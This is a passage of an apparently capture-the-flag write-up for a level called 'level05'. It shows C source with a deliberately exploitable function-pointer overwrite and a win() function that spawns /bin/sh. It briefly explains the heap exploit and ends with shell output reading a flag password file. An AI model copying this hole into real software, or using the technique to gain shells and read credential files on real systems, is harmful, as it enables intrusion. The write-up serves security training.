
```c
#define DATA_SIZE 40
#define MAX_SIGNALS 16
typedef struct signal_s {
    void (*process)(struct signal_s *);
    char data[DATA_SIZE];
} signal_t;
static signal_t *signals[MAX_SIGNALS];
__attribute__((used)) static void win(void) {
    system("/bin/sh");
}

static void default_process(signal_t *s) {
    printf("[ANGIE] signal processed: %.8s\n", s->data);
}

static void capture(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_SIGNALS) return;
    signals[i] = malloc(sizeof(signal_t));
    signals[i]->process = default_process;
    memset(signals[i]->data, 0, DATA_SIZE);
    printf("[ANGIE] signal captured in slot %ld.\n", i);
}

static void write_signal(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_SIGNALS || !signals[i]) return;
    printf("len: "); fflush(stdout); size_t n = (size_t)rd_long();
    if (n > sizeof(signal_t)) n = sizeof(signal_t);
    printf("data: "); fflush(stdout);
    read(STDIN_FILENO, signals[i], n);
}
```
This time the exploit was a direct allocation by invoking ``capture`` which create chunk A , overriting the first 8 bytes of the chunk A with the leaked ``win``, and then call the process function :
```c
static void process_signal(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_SIGNALS || !signals[i]) return;
    signals[i]->process(signals[i]);
}
```
check the ``exploit.py``, and finaly we got the result of :
```sh
level05@override:~$ python3 exploit.py 
[+] Starting local process './angie': pid 46455
[*] Switching to interactive mode
$ ls
README  angie  angie.c  exploit.py
$ whoami
flag05
$ cat /home/flag05/.pass
p68rr34sffxhpmhx66ata31keosik24d
```